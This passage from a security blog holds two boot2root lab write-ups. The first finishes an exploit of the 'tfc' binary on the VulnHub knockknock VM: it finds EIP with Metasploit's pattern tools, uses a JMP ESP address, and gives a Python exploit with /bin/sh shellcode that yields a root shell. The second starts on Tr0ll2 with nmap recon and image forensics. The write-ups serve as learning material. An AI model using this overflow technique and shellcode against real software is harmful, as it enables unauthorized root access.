<p>With the script done I obviously had to test it. I have a buffer of 1000 <em>A</em>&rsquo;s as the content and redirected the script output to a file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# python make-crypt.py &gt; test.tfc
</span><span class='line'>
</span><span class='line'>root@kali:~# head test.tfc
</span><span class='line'>��<span class="o">[</span>�<span class="o">]</span>��C��dl�
</span><span class='line'>              H<span class="o">)</span>�Aotg�<span class="se">\!</span>�E?�̀l+�B��<span class="nv">$f5</span>%�<span class="p">&amp;</span>�y�<span class="p">|</span>S<span class="o">[</span>I<span class="p">;</span>R.�+T��w�<span class="nv">$͟</span>�7��?i�w<span class="err">&#39;</span>�3�s&lt;A��^��
</span><span class='line'>
</span><span class='line'>root@kali:~# ./tfc test.tfc out.tfc
</span><span class='line'>&gt;&gt; File crypted, goodbye!
</span><span class='line'>
</span><span class='line'>root@kali:~# head out.tfc
</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></code></pre></td></tr></table></div></figure>


<p>So to recap. We generated a file <code>test.tfc</code>, which is the encrypted version of 1000 <em>A</em>&rsquo;s. We then ran it through <code>tfc</code> which decrypted it to our cleartext <em>A</em>&rsquo;s again.</p>

<h2>finding EIP</h2>

<p>With the ability of generating encrypted files of any length now, we had everything we needed to find EIP from the previously suspected stack overflow. Worst case, we can have a clean buffer of <code>41</code>&rsquo;s to work with in a debugger. So the next run, I changed the content to 6000 <em>A</em>&rsquo;s, and ran it through <code>gdb</code> to be able to inspect the Segmentation Fault that occurs.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# python make-crypt.py &gt; crash.tfc
</span><span class='line'>
</span><span class='line'>root@kali:~# gdb -q ./tfc
</span><span class='line'>Reading symbols from /root/tfc...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>
</span><span class='line'>gdb-peda<span class="nv">$ </span>r crash.tfc crash-out.tfc
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
</span><span class='line'>EAX: 0x0
</span><span class='line'>EBX: 0xb7fbfff4 --&gt; 0x14bd7c
</span><span class='line'>ECX: 0xffffffc8
</span><span class='line'>EDX: 0x9 <span class="o">(</span><span class="s1">&#39;\t&#39;</span><span class="o">)</span>
</span><span class='line'>ESI: 0x0
</span><span class='line'>EDI: 0x0
</span><span class='line'>EBP: 0x41414141 <span class="o">(</span><span class="s1">&#39;AAAA&#39;</span><span class="o">)</span>
</span><span class='line'>ESP: 0xbffff3d0 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats 200 <span class="nb">times</span>&gt;...<span class="o">)</span>
</span><span class='line'>EIP: 0x41414141 <span class="o">(</span><span class="s1">&#39;AAAA&#39;</span><span class="o">)</span>
</span><span class='line'>EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
</span><span class='line'>Invalid <span class="nv">$PC</span> address: 0x41414141
</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
</span><span class='line'>0000<span class="p">|</span> 0xbffff3d0 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats 200 <span class="nb">times</span>&gt;...<span class="o">)</span>
</span><span class='line'>0004<span class="p">|</span> 0xbffff3d4 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats 200 <span class="nb">times</span>&gt;...<span class="o">)</span>
</span><span class='line'>0008<span class="p">|</span> 0xbffff3d8 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats 200 <span class="nb">times</span>&gt;...<span class="o">)</span>
</span><span class='line'>0012<span class="p">|</span> 0xbffff3dc <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats 200 <span class="nb">times</span>&gt;...<span class="o">)</span>
</span><span class='line'>0016<span class="p">|</span> 0xbffff3e0 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats 200 <span class="nb">times</span>&gt;...<span class="o">)</span>
</span><span class='line'>0020<span class="p">|</span> 0xbffff3e4 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats 200 <span class="nb">times</span>&gt;...<span class="o">)</span>
</span><span class='line'>0024<span class="p">|</span> 0xbffff3e8 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats 200 <span class="nb">times</span>&gt;...<span class="o">)</span>
</span><span class='line'>0028<span class="p">|</span> 0xbffff3ec <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats 200 <span class="nb">times</span>&gt;...<span class="o">)</span>
</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x41414141 in ?? <span class="o">()</span>
</span><span class='line'>gdb-peda<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p><strong>BOOM!</strong> A cleanly overwritten EIP! :) At this stage I was fairly confident the rest of the exploit was a plain and simple stack overflow. I proceeded to fire up <code>pattern_create</code> from the Metasploit framework to generate me a unique string of 6000 characters. I then swapped out the content from my 6000 <em>A</em>&rsquo;s to this pattern and rerun the crash in <code>gdb</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# python make-crypt.py &gt; crash.tfc
</span><span class='line'>
</span><span class='line'>root@kali:~# gdb -q ./tfc
</span><span class='line'>Reading symbols from /root/tfc...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>gdb-peda<span class="nv">$ </span>r crash.tfc crash-out.tfc
</span><span class='line'>
</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x35684634 in ?? <span class="o">()</span>
</span><span class='line'>gdb-peda<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>With the crash at <code>0x35684634</code>, we check up with <code>pattern_offset</code> to see where exactly in that 6000 character buffer this pattern occurs:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 35684634
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Exact match at offset 4124
</span></code></pre></td></tr></table></div></figure>


<p>This means EIP starts at byte 4124 of evil buffer. So back I went to our file generation script and changed the payload to send 4124 <em>A</em>&rsquo;s and then 4 <em>B</em>&rsquo;s, and padded the rest with <em>C</em>&rsquo;s up to 6000 characters.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">content</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> *4124 + <span class="s2">&quot;BBBB&quot;</span> + <span class="s2">&quot;C&quot;</span>*<span class="o">(</span>6000-4124-4<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This resulted in a crash at <code>0x42424242</code> in <code>gdb</code> which was perfect!</p>

<h2>exploiting tfc</h2>

<p>The only thing that was left to do was to find a <code>JMP ESP</code> instruction we could jump to, and add some shell code on to the stack. Since the binary compiled with <code>NO NX</code>, it should happily execute code on it.</p>

<p><img src="https://i.imgur.com/Mqkfe8l.png"></p>

<p>Using Evans Debugger (run with <code>edb --run ./tfc</code>), I searched for a <em>JMP ESP</em> instruction and found one in <code>tfc</code> itself at <code>0x08048e93</code>. This is where we will tell EIP to point to when we corrupt the memory. That means our contents will change to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">content</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> *4124 + <span class="s2">&quot;\x93\x8e\x04\x08&quot;</span> + <span class="s2">&quot;C&quot;</span>*<span class="o">(</span>6000-4124-4<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Lastly, we need some shell code. I just re-used some <code>/bin/sh</code> shell code I have stashed away for this one, and added it to the buffer after a few NOP&rsquo;s just in case. Normally one would have to actually first check for any bad characters that may cause our shellcode to break when sent via the buffer. I skipped this and was lucky to have a working one first try. The final exploit therefore has the following section to prepare the contents:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># 08048e93  ; jmp esp</span>
</span><span class='line'>    <span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span>
</span><span class='line'>        <span class="s">&quot;</span><span class="se">\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68</span><span class="s">&quot;</span> <span class="o">+</span>
</span><span class='line'>        <span class="s">&quot;</span><span class="se">\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80</span><span class="s">&quot;</span>
</span><span class='line'>    <span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">content</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span><span class="mi">4124</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\x93\x8e\x04\x08</span><span class="s">&quot;</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="mi">16</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="s">&quot;C&quot;</span> <span class="o">*</span><span class="p">(</span><span class="mi">6000</span><span class="o">-</span><span class="mi">4124</span><span class="o">-</span><span class="mi">4</span><span class="o">-</span><span class="mi">16</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
</span><span class='line'>    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">encrypted</span> <span class="o">=</span> <span class="n">xcrypt</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="n">length</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="n">encrypted</span>
</span></code></pre></td></tr></table></div></figure>


<p>With the contents prepared, we would then run it outside of a debugger to test and get dropped into a shell. That concluded the testing and the script was ready for use on the VM. So, I copied the python over to <code>jason</code>&rsquo;s home directory and executed it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>jason@knockknock:~<span class="nv">$ </span>python make-crypt.py &gt; crash.tfc <span class="o">&amp;&amp;</span> ./tfc crash.tfc crash-out.tfc
</span><span class='line'><span class="c"># id</span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>jason<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,1000<span class="o">(</span>jason<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>pwnd!</p>

<p>As proof, the flag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># cat /root/the_flag_is_in_here/qQcmDWKM5a6a3wyT.txt</span>
</span><span class='line'> __                         __              __                         __      ____
</span><span class='line'><span class="p">|</span>  <span class="p">|</span> __ ____   ____   ____ <span class="p">|</span>  <span class="p">|</span> __         <span class="p">|</span>  <span class="p">|</span> __ ____   ____   ____ <span class="p">|</span>  <span class="p">|</span> __ /_   <span class="p">|</span>
</span><span class='line'><span class="p">|</span>  <span class="p">|</span>/ //    <span class="se">\ </span>/  _ <span class="se">\_</span>/ ___<span class="se">\|</span>  <span class="p">|</span>/ /  ______ <span class="p">|</span>  <span class="p">|</span>/ //    <span class="se">\ </span>/  _ <span class="se">\_</span>/ ___<span class="se">\|</span>  <span class="p">|</span>/ /  <span class="p">|</span>   <span class="p">|</span>
</span><span class='line'><span class="p">|</span>    &lt;<span class="p">|</span>   <span class="p">|</span>  <span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  <span class="se">\_</span>__<span class="p">|</span>    &lt;  /_____/ <span class="p">|</span>    &lt;<span class="p">|</span>   <span class="p">|</span>  <span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  <span class="se">\_</span>__<span class="p">|</span>    &lt;   <span class="p">|</span>   <span class="p">|</span>
</span><span class='line'><span class="p">|</span>__<span class="p">|</span>_ <span class="se">\_</span>__<span class="p">|</span>  /<span class="se">\_</span>___/ <span class="se">\_</span>__  &gt;__<span class="p">|</span>_ <span class="se">\ </span>        <span class="p">|</span>__<span class="p">|</span>_ <span class="se">\_</span>__<span class="p">|</span>  /<span class="se">\_</span>___/ <span class="se">\_</span>__  &gt;__<span class="p">|</span>_ <span class="se">\ </span> <span class="p">|</span>___<span class="p">|</span>
</span><span class='line'>     <span class="se">\/</span>    <span class="se">\/</span>            <span class="se">\/</span>     <span class="se">\/</span>              <span class="se">\/</span>    <span class="se">\/</span>            <span class="se">\/</span>     <span class="se">\/</span>
</span><span class='line'>
</span><span class='line'>Hooray you got the flag!
</span><span class='line'>
</span><span class='line'>Hope you had as much fun r00ting this as I did making it!
</span><span class='line'>
</span><span class='line'>Feel free to hit me up in <span class="c">#vulnhub @ zer0w1re</span>
</span><span class='line'>
</span><span class='line'>Gotta give a big shout out to c0ne, who helpped to make the tfc binary challenge,
</span><span class='line'>as well as rasta_mouse, and recrudesce <span class="k">for </span>helping to find bugs and <span class="nb">test </span>the VM :<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>root password is <span class="s2">&quot;qVx4UJ*zcUdc9#3C$Q&quot;</span>, but you should already have a shell, right? <span class="p">;</span><span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>There are a number other goodies in /root to check out so be sure to do that!</p>

<h2>conclusion</h2>

<p>Big shoutout to <a href="https://twitter.com/zer0w1re">@zer0w1re</a> for the VM and as always <a href="https://twitter.com/vulnhub">@VulnHub</a> for the hosting. The learning experience has been invaluable! :)</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/10/10/another-troll-tamed-solving-troll-2/">another troll tamed - solving troll 2</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-10-10T17:32:35+02:00" pubdate data-updated="true">Oct 10<sup>th</sup>, 2014</time>
        
      </p>
    
  </header>


  <div class="entry-content"><h2>foreword</h2>

<p><a href="">Tr0ll2</a> is a successor in a boot2root series by <a href="https://twitter.com/Maleus21">@Maleus21</a> hosted over at <a href="http://vulnhub.com/">VulnHub</a>. Having been able to <a href="https://leonjza.github.io/blog/2014/08/15/taming-the-troll/">pwn Tr0ll1</a>, I gave this one a shot too.</p>

<p>Here is my experience taming the troll, again.</p>

<h2>getting started</h2>

<p>Like almost all boot2roots, we get right into it by slapping the VM into a hypervisor (VirtualBox in my case), discovering the IP address and running a <code>nmap</code> against it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/troll2# nmap -sV --reason 192.168.56.101
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-10 06:55 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.101
</span><span class='line'>Host is up, received reset <span class="o">(</span>0.00031s latency<span class="o">)</span>.
</span><span class='line'>Not shown: 997 filtered ports
</span><span class='line'>Reason: 997 no-responses
</span><span class='line'>PORT   STATE SERVICE REASON  VERSION
</span><span class='line'>21/tcp open  ftp     syn-ack vsftpd 2.0.8 or later
</span><span class='line'>22/tcp open  ssh     syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span><span class='line'>80/tcp open  http    syn-ack Apache httpd 2.2.22 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span><span class='line'>Service Info: Host: Tr0ll<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span><span class='line'>
</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 15.21 seconds
</span></code></pre></td></tr></table></div></figure>


<p>ftp, ssh and http. Quite an attack surface to start with. I start with a quick google for <em>vsftpd 2.0.8 exploit</em> with nothing apparently obvious jumping out at me. I also quickly attempt to SSH to the server just to check if there aren&rsquo;t any strange banners etc to be found which was not the case.</p>

<h2>web server</h2>

<p>Opening up a browser to <a href="http://192.168.56.101">http://192.168.56.101</a> revealed a familiar image:</p>

<p><img src="https://i.imgur.com/7lyyzPS.png">
Oh. Hai. The sources serving up the image had the comment <code>&lt;!-- Nothing to see here, but good try NOOB!&gt;</code> with the image.</p>

<p>Further poking around got me to checking if a robots.txt file was present. It was and contained some interestingly named entries. Some of the directories would 404, however a few would 200 with exactly the same content. The directories that returned HTTP 200 were:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>/keep_trying
</span><span class='line'>/dont_bother
</span><span class='line'>/noob
</span><span class='line'>/ok_this_is_it
</span></code></pre></td></tr></table></div></figure>


<p>The content served up at these URLs:</p>

<p><img src="https://i.imgur.com/yH4vTKx.png"></p>

<p>The source that serves up this image had the comment <code>&lt;!--What did you really think to find here? Try Harder!&gt;</code> with the image.</p>

<p>So with exactly the same content displayed for all of the directories that are present, I was a little unsure of where to go next. For all I knew, these 4 directories may have been a symlink to the same place. The HTML sources were the same as well as the images. I figured the next thing I could do was download the images and compare exifdata. I put the URL&rsquo;s that would 200 into a text file from the <code>robots.txt</code> and looped over them downloading the images:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# <span class="k">for </span>line in <span class="k">$(</span>cat 200.txt<span class="k">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">&quot;==&gt;$line&lt;==&quot;</span> <span class="o">&amp;&amp;</span> wget 192.168.56.101/<span class="nv">$line</span>/cat_the_troll.jpg<span class="p">;</span> <span class="k">done</span>
</span><span class='line'>
</span><span class='line'><span class="o">==</span>&gt;/ok_this_is_it&lt;<span class="o">==</span>
</span><span class='line'>--2014-10-10 07:31:37--  http://192.168.56.101/ok_this_is_it/cat_the_troll.jpg
</span><span class='line'>Connecting to 192.168.56.101:80... connected.
</span><span class='line'>HTTP request sent, awaiting response... 200 OK
</span><span class='line'>Length: 15831 <span class="o">(</span>15K<span class="o">)</span> <span class="o">[</span>image/jpeg<span class="o">]</span>
</span><span class='line'>Saving to: <span class="sb">`</span>cat_the_troll.jpg.3<span class="s1">&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="s1">100%[=======&gt;] 15,831      --.-K/s   in 0s      </span>
</span><span class='line'>
</span><span class='line'><span class="s1">2014-10-10 07:31:37 (191 MB/s) - `cat_the_troll.jpg.3&#39;</span> saved <span class="o">[</span>15831/15831<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Immediately when you <code>ls</code> the directory containing the images will you notice a difference:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ls -l
</span><span class='line'>total 68
</span><span class='line'>-rw-r--r-- 1 root root    47 Oct 10 07:31 200.txt
</span><span class='line'>-rw-r--r-- 1 root root 15831 Oct  4 10:57 cat_the_troll.jpg
</span><span class='line'>-rw-r--r-- 1 root root 15873 Oct  4 10:31 cat_the_troll.jpg.1 <span class="c">#&lt;---</span>
</span><span class='line'>-rw-r--r-- 1 root root 15831 Oct  4 10:57 cat_the_troll.jpg.2
</span><span class='line'>-rw-r--r-- 1 root root 15831 Oct  4 10:57 cat_the_troll.jpg.3
</span></code></pre></td></tr></table></div></figure>


<p>One of the entires has a different timestamp to the others. A quick glance on the exifdata did not reveal any differences, however, running a <code>cmp</code> on the files hinted towards what may be up.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# cmp cat_the_troll.jpg cat_the_troll.jpg.1
</span><span class='line'>cmp: EOF on cat_the_troll.jpg
</span></code></pre></td></tr></table></div></figure>


<p>Sweet, so lets print the last line of both and check what the diff is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/troll2/c# tail -n 1 cat_the_troll.jpg
</span><span class='line'>8�z2��p�T�lj<span class="se">\p</span>��?�&lt;�S�۪��6�#���7U y���*/ p?E<span class="nv">$�</span>��%<span class="o">=</span>���.�B���o�ES_�
</span><span class='line'>
</span><span class='line'>root@kali:~/Desktop/troll2/c# tail -n 1 cat_the_troll.jpg.1
</span><span class='line'>8�z2��p�T�lj<span class="se">\p</span>��?�&lt;�S�۪��6�#���7U y���*/ p?E<span class="nv">$�</span>��%<span class="o">=</span>���.�B���o�ES_��Look Deep within y0ur_self <span class="k">for </span>the answer
</span></code></pre></td></tr></table></div></figure>


<p><em>Look Deep within y0ur_self for the answer</em>. Hmm. Keeping in mind some of the previous tricks tr0ll had and the fact that the words <em>y0ur_self</em> were written differently, I tried to use this as a web path:</p>

<p><img src="https://i.imgur.com/oNInvrf.png"></p>

<p>I downloaded <code>answer.txt</code> and started to check what is happening inside:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# head answer.txt
</span><span class='line'><span class="nv">QQo</span><span class="o">=</span>
</span><span class='line'><span class="nv">QQo</span><span class="o">=</span>
</span><span class='line'>QUEK
</span><span class='line'>QUIK
</span><span class='line'><span class="nv">QUJNCg</span><span class="o">==</span>
</span><span class='line'>QUMK
</span><span class='line'><span class="nv">QUNUSAo</span><span class="o">=</span>
</span><span class='line'>QUkK
</span><span class='line'><span class="nv">QUlEUwo</span><span class="o">=</span>
</span><span class='line'>QU0K
</span></code></pre></td></tr></table></div></figure>


<p>Looks a lot like base64 hey? Lets try decode it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# cat answer.txt <span class="p">|</span> base64 -d <span class="p">|</span> head
</span><span class='line'>A
</span><span class='line'>A
</span><span class='line'>AA
</span><span class='line'>AB
</span><span class='line'>ABM
</span><span class='line'>AC
</span><span class='line'>ACTH
</span><span class='line'>AI
</span><span class='line'>AIDS
</span><span class='line'>AM
</span></code></pre></td></tr></table></div></figure>


